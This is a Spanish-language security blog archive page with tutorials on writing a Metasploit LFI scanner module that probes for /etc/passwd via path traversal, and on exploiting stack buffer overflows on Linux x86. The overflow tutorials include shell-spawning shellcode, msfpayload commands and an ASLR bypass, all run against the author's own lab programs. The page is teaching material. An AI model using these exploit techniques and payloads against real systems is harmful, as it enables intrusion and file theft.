imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/w3ALLIF.png" /></a></div><br />Lo primero que haremos sera importar el modulo msf/core y crer una clase en la cual heredaremos los metodos de Msf::Auxiliary.<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ require 'msf/core'  class Metasploit4 < Msf::Auxiliary  end  ]]></script> Luego crearemos el metodo initialize que contendra dos funciones: super() y register_options().<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ require 'msf/core'  class Metasploit4 < Msf::Auxiliary      def initialize          super()          register_options() end  end  ]]></script> super() contendra la informacion de nuestro auxiliar, tales como la version, el nombre del autor, la descripcion del modulo, etc.<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ require 'msf/core'  class Metasploit4 < Msf::Auxiliary      def initialize          super(         'Name' => 'LFI scanner',         'Version' => '1.0',         'Description' => 'Scanner para realizar inyecciones LFI',         'Author' => '[Q]3rV[0]',         'License'=> MSF_LICENSE          )          register_options()  end end  ]]></script> Por otro lado register_options() contendra las opciones del auxiliar, y es donde definiremos los argumentos para luego setearlos desde msf.  La funcion tomara dos argumentos.<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ register_options([],self.class)  ]]></script> Dentro del array definiremos las opciones teniendo tipos como:<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ OptInt.new() # Para valores enteros OptString.new() # Para cadenas OptAddress.new() # Para direcciones  ]]></script> En nuestro caso quedaria de la siguiente maner:<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ require 'msf/core'  class Metasploit4 < Msf::Auxiliary      def initialize          super(         'Name' => 'LFI scanner',         'Version' => '1.0',         'Description' => 'Scanner para realizar inyecciones LFI',         'Author' => '[Q]3rV[0]',         'License'=> MSF_LICENSE          )          register_options([OptString.new('RHOST',[true, 'Indique el target']),                   OptInt.new('TRAVERSAL',[true, 'Path traversal'])], self.class)  end end  ]]></script> Fijense la sintaxis de Optxx.<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ OptString.new('RHOST',[true, 'Indique el target'])  ]]></script> Recibe dos argumentos, el primero indica el nombre del parametro, el segundo es un array que contiene como primer indice un valor boleano que indica si es prescindible definir esa variable, y el segundo indice contiene la descripcion de la opcion.<br /><br />Bien, ahora pasemos a la parte donde hubicaremos el codigo del scanner.  Definiremos otro metodo llamado run() donde incluiremos el codigo.<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ require 'msf/core' require 'net/http' require 'uri'  class Metasploit4 < Msf::Auxiliary      def initialize          super(         'Name' => 'LFI scanner',         'Version' => '1.0',         'Description' => 'Scanner para realizar inyecciones LFI',         'Author' => '[Q]3rV[0]',         'License'=> MSF_LICENSE          )          register_options([OptString.new('RHOST',[true, 'Indique el target']),                   OptInt.new('TRAVERSAL',[true, 'Path traversal'])], self.class)  end      def run()          def conn(vector)          host=URI.parse(vector)          return Net::HTTP.get(host)      end      def compr(data, vector)          if data =~ /root:/             puts "Parametro vulnerable a LFI -> #{vector}\n"         else             puts "Not Found -> #{vector}\n"      end     end      def lfi(web, pb, file)          a=0          while a<pb             a=a+1              traversal="../"*a+file             vector=web+traversal              data=conn(vector)              compr(data, vector)          end         end      lfi(ARGV[0], ARGV[1].to_i, "etc/passwd")     lfi(ARGV[0], ARGV[1].to_i, "etc/passwd")      end  end   ]]></script> Pero todavia falta el pasaje de los argumentos y eso lo haremos con datastore[‘PARAMETRO’], donde PARAMETRO seran los antes definidos con Optxxx.new()  Quedando finalizado nuestro modulo auxiliar para Msf.<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ require 'msf/core' require 'net/http' require 'uri'  class Metasploit4 < Msf::Auxiliary      def initialize          super(         'Name' => 'LFI scanner',         'Version' => '1.0',         'Description' => 'Scanner para realizar inyecciones LFI',         'Author' => '[Q]3rV[0]',         'License'=> MSF_LICENSE          )          register_options([OptString.new('RHOST',[true, 'Indique el target']),                    OptInt.new('TRAVERSAL',[true, 'Path traversal'])], self.class)  end      def run()          def conn(vector)          host=URI.parse(vector)          return Net::HTTP.get(host)      end      def compr(data, vector)          if data =~ /root:/             puts "Parametro vulnerable a LFI -> #{vector}\n"         else             puts "Not Found -> #{vector}\n"      end     end      def lfi(web, pb, file)          a=0          while a<pb             a=a+1              traversal="../"*a+file             vector=web+traversal              data=conn(vector)              compr(data, vector)          end         end      lfi(datastore['RHOST'], datastore['TRAVERSAL'], "etc/passwd")     lfi(datastore['RHOST'], datastore['TRAVERSAL'], "etc/passwd")      end  end  ]]></script> Para terminar agregaremos el auxiliar a msf, crearemos un direcotorio en /opt/metasploit/apps/pro/msf3/modules/auxiliary y copiaremos nuestro script dentro.<br /><br />Luego accederemos a el.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/0ueSEgq.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/0ueSEgq.png" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/qL8scnG.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/qL8scnG.png" /></a></div><br /></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/01/14/desbordando-el-buffer-en-linux-x86-iii_14/">Desbordando El Buffer en Linux X86 (III)</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-01-14T12:27:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:27 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://www.entrebrumas.com/wp-content/uploads/2010/06/blue_by_splutphoto.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://www.entrebrumas.com/wp-content/uploads/2010/06/blue_by_splutphoto.jpg" height="450" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><div style="text-align: right;"><b>By [Q]3rV[0]</b></div><div style="text-align: right;"><br /></div>Esta es la tercera  parte de una serie de tutoriales para aprender a  explotar el buffer en sistemas Linux x86. En el <a href="http://www.securitysignal.tk/2015/01/desbordando-el-buffer-en-linux-x86-ii.html">anterior</a> apartado se  logro encastrar codigo ejecutable y obtener una shell, pero para  lograrlo debimos desactivar previamente ASLR.  Como explique  anteriormente este sistema de seguridad nos dificulta un poco las cosas randomizando la memoria.<br /><br />Compilaremos el siguiente codigo que sera usado durante la realizacion de este tutorial.<br /><br /><script class="brush: c" type="syntaxhighlighter"><![CDATA[ #include <stdio.h>#include <string.h> void funcion_vulnerable(char* input) {     char buffer[1000];     strcpy(buffer, input); } int main(int argc, char** argv) {     funcion_vulnerable(argv[1]);     return 0; }  ]]></script> Verificamos que ASLR se encuentra activo.<br /><br /><script class="brush: c" type="syntaxhighlighter"><![CDATA[ cat /proc/sys/kernel/randomize_va_space 2 ]]></script> De otra manera lo activaremos.<br /><br /><script class="brush: c" type="syntaxhighlighter"><![CDATA[ echo 2 > /proc/sys/kernel/randomize_va_space ]]></script> Ahora simplemente realizaremos los pasos descriptos en los anteriores capitulos. Compilamos el code.<br /><br /><script class="brush: c" type="syntaxhighlighter"><![CDATA[ gcc -o vuln -fno-stack-protector -mpreferred-stack-boundary=2 -ggdb -z execstack vuln.c ]]></script> Presten atencion al flag -z execstack, esto simplemente vuelve ejecutable el stack ya que NX (Non-Exec) es otra proteccion que al igual que ASLR nos va a romper bastante las pelotas denegandonos la ejecucion de un shellcode en la memoria.  Pero de todas maneras se puede evadir, tema que se tocara en el proximo tuto.<br /><br />&nbsp;Buscamos la sobrescritura del EIP.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ r $(python -c 'print "\x41"*1004+"\x42"*4') ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/VsmMcJN.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/VsmMcJN.png" /></a></div><br />Hasta aca todo muy lindo, pero todavia tenemos que saltarnos ASLR.  Una manera de hacer esto es buscando dentro del binario alguna instruccion de llamada o salto (CALL/JMP) a algun registro. Por que si nos basamos en seguir el anterior tutorial donde sobrescribiamos el EIP con una direccion dentro de ESP que aputaba a un NOP Sled+Shellcode, simplemente no va a funcar, por el echo de que la memoria va a cambiar en cada ejecucion.  Esto podemos hacerlo con objdump.<br /><br />&nbsp;Buscaremos la existencia de alguna instruccion CALL<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ objdump -d vuln|grep call ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/WcOw5wZ.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/WcOw5wZ.png" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/2cbfPTg.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/2cbfPTg.png" /></a></div><br />Perfecto, objdump nos arroja dos direcciones que llaman al registro EAX.<br /><ul><li>8048387&nbsp;</li><li>804840f&nbsp;</li></ul>Entonces se nos ocurre que si podemos escribir en EAX nuestro shellcode y pintar el EIP con la direccion CALL lograriamos realmente “pintarle la cara a ASLR”.  Bien, hay una parte del buffer en EAX?<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ x/100x $eax ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/8MiR1WD.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/8MiR1WD.png" /></a></div><br />Como se aprecia, logramos tocar el comienzo del registro, ahora solamente nos falta generar el payload.  Ahora si nos apoyaremos en MSF para moldear un Shellcode.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ msf > msfpayload linux/x86/exec CMD=/bin/bash C ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/b5EaI5R.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/b5EaI5R.png" /></a></div><br />El unico problema que surge, es que si miramos el shellcode, este contiene “badchars”, como por ejemplo la presencia de nullbytes \x00 que nos van a cortar la cadena.  Asi que le pasamos la salida a msfencode para ofuscar un poco el code.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ msf > msfpayload linux/x86/exec CMD=/bin/bash R|msfencode -a x86 -e x86/alpha_mixed -b 'x\00\x0d\x0a' -t c ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/Z4R607W.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/Z4R607W.png" /></a></div><br />Fijense en el flag -b de msfencode y entre comillas la lista de badchars a evadir.  Ahora tenemos el codigo limpio y listo para agregarlo al payload que quedara de la siguiente manera.<br /><br />Le restamos la longitud del Shellcode al buffer.<br /><br />1004-152=852<br /><br />Menos 400 NOPS que iran antes del EIP, quedando el vector de la siguiente manera.<br /><br />NOPS(452)+Shellcode(152)+NOPS(400)+EIP (call eax \x87\x83\x04\x08)<br /><br />Lanzamos el exploit&nbsp; <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/g1TDSom.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/g1TDSom.png" /></a></div><br />Logrando esquivar satisfactoriamente ASLR.</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/01/14/desbordando-el-buffer-en-linux-x86-ii/">Desbordando El Buffer en Linux X86 (II)</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-01-14T04:25:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:25 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div style="text-align: center;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="https://media.licdn.com/mpr/mpr/p/5/005/051/021/07ececf.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="300" src="https://media.licdn.com/mpr/mpr/p/5/005/051/021/07ececf.jpg" width="400" /></a></div><div style="text-align: right;"><b>by [Q]3rv[0]</b></div><br />En la <a href="http://www.securitysignal.tk/2015/01/desbordando-el-buffer-en-linux-x86-i.html">entrada</a> anterior se hizo una pequeña introducción al funcionamiento del stack y a los registros del procesador. Además se logro modificar el flujo&nbspde&nbspdatos de un programa para que atente a una función que no había sido llamada.<br /><br />En este nuevo apartado se vera como inyectar un shellcode en la memoria para lograr ejecutar código a travez del desbordamiento.<br /><br />Para el poc se va a utlizar el mismo source que la vez pasada salvo que el buffer aumentara su tamaño a 500 bytes.<br />Seguimos lo mismos pasos que en el paper anterior.<br /><br />Desactivamos ASLR<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ echo 0 > /proc/sys/kernel/randomize_va_space ]]></script> y compilamos<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ gcc -ggdb -fno-stack-protector -mpreferred-stack-boundary=2 -o vuln vuln.c ]]></script> Abrimos gdb y arrancamos por pasarle 506 caracteres<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ run $(python -c 'print "\x41"*506') ]]></script> <div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/mGWY0Ol.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/mGWY0Ol.png" height="348" width="640" /></a></div><br /><br />Ya vemos como se va llenando el EIP<br /><br />Agregamos 2 mas y lo terminamos de completar.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ run $(python -c 'print "\x41"*508') ]]></script> <div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/R9umyqW.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/R9umyqW.png" height="164" width="640" /></a></div><br /><br />Ahora bien hasta aca todo perfecto, ahora tenemos que buscar donde poder incrustar el shellcode.<br /><br />Un shellcode no es mas que un conjunto de instrucciones en ensamblador programado para una tarea especifica, el shellcode que se vera a continuacion nos dara una sesion sh en el sistema. Como dije anteriormente una vez que pasamos el tamaño limite del buffer, los datos comienzan a escribirse en los demas registros, entonces vamos a ver en que otro lugar se mandaron las A's, si le echamos una ojeada al registro ESP.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ x/100x $esp ]]></script> El anterior comando nos mostrara 100 direcciones dentro de ESP<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/vBRo9C0.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/vBRo9C0.png" height="640" width="612" /></a></div><br />Se puede ver que parte del buffer se ha inyectado al registro, perfect!<br />Ahora solamente tenenemos que buscar/generar un shellcode acorde a nuestra arquitectura y OS<br /><br />Podriamos generarlo con metasploit, pero para este apartado voy a utilizar uno que encontre en shell-storm<br /><br /><a href="http://shell-storm.org/shellcode/files/shellcode-827.php">http://shell-storm.org/shellcode/files/shellcode-827.php</a><br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80 ]]></script> El shellcode tiene un tamaño de 23 bytes por le que le restamos la long al buffer-4 bytes pertenecientes al EIP y lo incluimos dentro del payload<br /><br />Quedando asi<br /><br />508 NOPS - 4 bytes (EIP) =504<br /><br />504 NOPS - 23 bytes (SHELLCODE) = 481 NOPS<br /><br />Payload= \x90*481+shellcode(23)+EIP(4)<br /><br />En este punto paso a explicar algo, por que reemplaze \x41 por \x90?<br /><br />\x90 es un NOP (no operacion), un NOP es una instruccion en ensamblador que simplemente no hace nada y nos servira como puente al shellcode que se escribe despues de esta.<br /><br />Ahora miremos como quedo el ESP luego de inyectar el payload, para esta ejecucion reemplaze el EIP por \x42=B.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ run $(python -c 'print "\x90"*481+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x42"*4') ]]></script> <script class="brush: bash" type="syntaxhighlighter"><![CDATA[ x/100x $esp ]]></script> <div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/M9lIAg0.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/M9lIAg0.png" height="640" width="616" /></a></div><br />En el recuadro verde vemos como se colaron los NOPS y en el rojo se ve como empieza a filtrarse el shellcode.<br /><br />Ahora lo unico que tenemos que hacer es indicar en el EIP cualquier direccion de memoria en donde se hayan alojado los NOPS<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/ij5uY3D.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/ij5uY3D.png" height="476" width="640" /></a></div><br />Usaremos esta : 0xbffffc70<br /><br />La invertimos, inyectamos y esperamos la shell!<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ run $(python -c 'print "\x90"*481+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x70\xfc\xff\xbf"') ]]></script> <div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/x1vl6vW.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/x1vl6vW.png" height="280" width="640" /></a></div><br />Hasta el momento se vio como explotar satisfactoriamente el desbordamiento, desactivando previamente ASLR para el proximo se vera una forma de bypassear ese sistema de seguridad.<br /><div style="text-align: right;">Saludos!</div><br /><br />Lectura Recomendada:<br /><a href="http://www.securitysignal.tk/2015/01/desbordando-el-buffer-en-linux-x86-i.html">http://www.securitysignal.tk/2015/01/desbordando-el-buffer-en-linux-x86-i.html</a></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/01/14/desbordando-el-buffer-en-linux-x86-i/">Desbordando El Buffer en Linux X86 (I)</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-01-14T04:24:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:24 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="https://c2.staticflickr.com/4/3246/3082468985_e7047ee5be_b.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="400" src="https://c2.staticflickr.com/4/3246/3082468985_e7047ee5be_b.jpg" width="400" /></a></div><div style="text-align: right;"><b>by [Q]3rv[0]</b></div><br />Cada vez que corremos un proceso en la maquina, se crea una memoria virtual para dicho proceso, ese segmento se divide en 3 partes, el texto, los datos&nbspy&nbsppor&nbspultimo&nbspel&nbspstack, que es donde nos vamos a concentrar para realizar la explotacion de este tipo de vulnerabilidad. <br /><br /><h3 style="text-align: center;"> <b>¿Que es el stack?</b> </h3>El stack es un segmento en la memoria que se encarga de almacenar datos y a su vez recuperarlos, administra la información en modo LIFO (last in first out), quiere decir que el ultimo dato en entrar es el primero en salir<br /><br />Un ejemplo mas sencillo seria comparar el stack con una pila de cd's, en el que el primer cd hace de base de la pila y para llegar a el hay que retirar uno por uno los que se encuentran encima. <br /><br />Entonces cada vez que se ingresa un dato al stack se utiliza una instruccion denominada PUSH y cuando se retira un dato se llama a la instruccion POP, algo similar a un array. <br /><br /><h3 style="text-align: center;"><b>Los registros del procesador</b></h3>El procesador cuenta con varios registros que cumplen diversas tareas en el stack, por el momento solo voy a mencionar a 3 de ellos. <br /><br /><b>EIP</b> - Registro que almacena la dirección de memoria de la proxima funcion que se va a ejecutar.  <br /><br /><b>ESP</b> - Apunta a la parte superior del stack <br /><br /><b>EBP</b> - Aputa a la base del stack   Ahora que ya se explicaron algunos conceptos basicos sobre el tema, vayamos al nudo del tutorial.   <br /><div style="text-align: center;"><h3><b>¿Que es un Buffer overflow?</b></h3></div>Empezemos por definir que es un buffer, no es mas que un espacio de memoria en donde se vuelcan datos para determinada accion por ejemplo, tengo el siguiente programa en c.  <br /><br /><pre class="brush: cpp">#include &lt;stdlib&gt;<br />#include &lt;stdio&gt;<br />#include &lt;string&gt;<br /> <br />int main(int argc, char *argv[]) {<br /> <br />    char buffer[10];<br /> <br />    strcpy(buffer, argv[1]);<br /> <br />    printf(buffer);<br /> <br />    return 0;<br />}<br /></pre>Donde se define un buffer de 10 bytes, luego se lo pasa a la funcion strcpy que almacena en el buffer el argumento insertado por el usuario, esta misma no se encarga de controlar el tamaño limite del buffer por lo tanto si se introduce una mayor cantidad de caracteres,  el espacio desbordara y comenzara a sobrescribir los registros de memoria cercanos al buffer.  <br /><br />Antes que nada, vamos a desactivar ASLR  ASLR en criollo es un sistema de seguridad que vuelve aleatoria las direcciones de la memoria virtual.  <br /><br /><pre class="brush bash">echo 0 &gt; /proc/sys/kernel/randomize_va_space</pre><pre class="brush bash">&nbsp;</pre>y compilaremos el prog con los siguientes flag de gcc.  <br /><br /><pre class="brush bash">gcc -ggdb -fno-stack-protector -mpreferred-stack-boundary=2 -o prog prog.c<br /><br /></pre>Para quitarle algunas protecciones al stack que le agrega gcc al compilar.  <br /><br />Probemos pasandole mas de 10 caracteres al programa.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/beDd3zp.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/beDd3zp.png" height="64" width="640" /></a></div><div style="text-align: center;"><br /></div>Como se ve el programa crashea, veamos que pasa por dentro con <b>gdb</b>.<br /><br /><pre class="brush: bash">gdb prog</pre><pre class="brush: bash">&nbsp;</pre>Le pasamos los argumentos<br /><br /><pre class="brush: bash">run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</pre><br />y una vez que el prog nos patee miramos en los registros a ver que encontramos? <br /><br /><pre class="brush: bash">info registers</pre><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/euFxWOT.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/euFxWOT.png" height="606" width="640" /></a></div><br />Como se ve en la imagen, se sobrescribieron dos registros como EIP y EBP con x41, que representa el caracter A en hex. <br /><br />Ahora por que crashea?, como explique anteriormente, el registro EIP contenia la direccion  de la proxima funcion a ejecutar, pero al ser sobreescrito con 4 A's, EIP termina apuntando a una direccion invalida.  <br /><br />Sabiendo que podemos inyectar en EIP, podriamos controlar el flujo del programa y mandarlo a la direccion que se nos ocurra.&nbsp;  <br /><br /><div style="text-align: center;"><h3><b>Controlando el flujo de ejecución</b></h3></div>Vamos con otro ejemplo pero un poco mas divertido.<br /><br />Le agregue la funcion owned() al programa anterior, que lo unico que hace es imprimir un texto.  <br /><br /><pre class="brush: cpp"><br />#include &lt;stdlib&gt;<br />#include &lt;stdio&gt;<br />#include &lt;string&gt;<br /> <br />void owned(){<br />    printf(&quot;Owned :)&quot;);<br />}<br /> <br /> <br />int main(int argc, char *argv[]) {<br /> <br />    char buffer[10];<br /> <br />    strcpy(buffer, argv[1]);<br /> <br />    printf(buffer);<br /> <br />return 0;<br />}<br /><br /></pre>Pero no vamos a llamarla en el code, sino que vamos a inyectarle la direccion de memoria de owned() al EIP para asi alterar la salida del prog.  <br /><br />Compilamos y abrimos con gdb.  <br /><br />Ahora tenemos que saber el punto exacto donde empieza a sobrescribirse EIP.<br /><br />Le pasamos 14 A's - nada  <br /><br />Le pasamos 15 A's y se puede ver como empieza a infectarse el EIP  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/7M8OvfU.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/7M8OvfU.png" height="278" width="640" /></a></div><div style="text-align: center;"><br /></div>Como una direccion de memoria esta compuesta por 4 bytes le sumamos 3 y tenemos el EIP bien pintado con 18 A's.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/bvB7Qoy.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/bvB7Qoy.png" height="196" width="640" /></a></div><div style="text-align: center;"><br /></div>Ahora solo nos queda averiguar la direccion donde la funcion owned() comienza a ser pusheada al stack, para esto vamos a desensamblarla  <br /><br /><pre class="brush: bash">disas owned<br /></pre><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/7KrlqNN.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/7KrlqNN.png" height="172" width="640" /></a></div><div style="text-align: center;"><br /></div>Se ven las instrucciones del codigo ensamblador, la primera linea comienza a pushear la funcion asi que usaremos esa direccion de memoria: 0x08048408  <br /><br />Ahora que tenemos la direccion con la que editaremos el EIP, solo basta restar 4 A's e incluirla.  <br /><br />A*14 + 0x08048408  <br /><br />Voy a utlizar python para realizar la inyeccion. como se ve, se utiliza el escape \x para codificar los datos.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/OVUuV7o.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/OVUuV7o.png" height="148" width="640" /></a></div><div style="text-align: center;"><br /></div><br />Pero si miramos la direccion a donde apunta el EIP vemos que esta al revez, esto pasa por que los procesadores Intel utilizan el sistema little-endian por lo tanto tendremos que invertir la direccion antes de ingresarla.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/vAT6OWw.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/vAT6OWw.png" height="170" width="640" /></a></div><div style="text-align: center;"><br /></div>Y ahora si logramos ver la salida de la funcion owned. <br /><br />Y si en vez de direccionar a una función, lograramos llegar hasta un shellcode alojado en la memoria?, eso se vera en la proximo entrada.<br /><br /><br /><div style="text-align: right;">Saludos!</div></div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/5">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/3">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - q3rv0 - hdbreaker -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
